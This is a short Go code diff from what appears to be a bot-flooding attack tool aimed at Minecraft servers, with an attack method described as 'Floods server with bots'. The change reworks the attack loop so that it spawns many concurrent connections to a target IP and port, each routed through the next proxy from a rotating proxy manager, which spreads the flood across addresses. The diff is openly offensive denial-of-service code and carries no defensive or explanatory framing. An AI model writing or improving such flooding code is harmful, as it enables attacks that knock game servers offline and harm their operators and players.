@@ -21,18 +21,18 @@ func (join Join) Description() string {
 	return "Floods server with bots"
 }
 
-func (join Join) Start(info *core.AttackInfo, dialPool *proxy.DialPool) {
+func (join Join) Start(info *core.AttackInfo, proxyManager *proxy.ProxyManager) {
 	shouldRun = true
 	for shouldRun {
 		for i := 0; i < info.PerDelay; i++ {
-			go connect(info, dialPool)
+			go connect(info, proxyManager.GetNext())
 		}
 		time.Sleep(info.Delay)
 	}
 }
 
-func connect(info *core.AttackInfo, dialPool *proxy.DialPool) {
-	conn, err := mc.DialMC(info.Ip, info.Port, dialPool.GetNext())
+func connect(info *core.AttackInfo, proxy *proxy.Proxy) {
+	conn, err := mc.DialMC(info.Ip, info.Port, proxy)
 	if err != nil {
 		return
 	}
